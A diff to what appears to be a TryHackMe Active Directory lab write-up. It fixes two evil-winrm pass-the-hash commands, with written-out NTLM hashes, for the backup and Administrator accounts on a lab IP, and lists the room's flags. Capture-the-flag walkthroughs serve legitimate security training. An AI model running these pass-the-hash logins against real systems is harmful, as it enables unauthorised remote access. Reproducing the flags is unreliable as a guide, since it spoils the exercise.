@@ -267,13 +267,13 @@ Answer-`TryHackMe{K3rb3r0s_Pr3_4uth}`
 
 backup
 
-Ran command`evil-winrm.rb -i 10.10.74.184 -u svc-admin -H 19741bde08e135f4b40f1ca9aab45538`
+Ran command`evil-winrm.rb -i 10.10.74.184 -u backup -H 19741bde08e135f4b40f1ca9aab45538`
 
 TryHackMe{B4ckM3UpSc0tty!}
 
 Administrator
 
-Ran command`evil-winrm.rb -i 10.10.74.184 -u svc-admin -H 0e0363213e37b94221497260b0bcb4fc
+Ran command`evil-winrm.rb -i 10.10.74.184 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
 
 TryHackMe{4ctiveD1rectoryM4st3r}
 
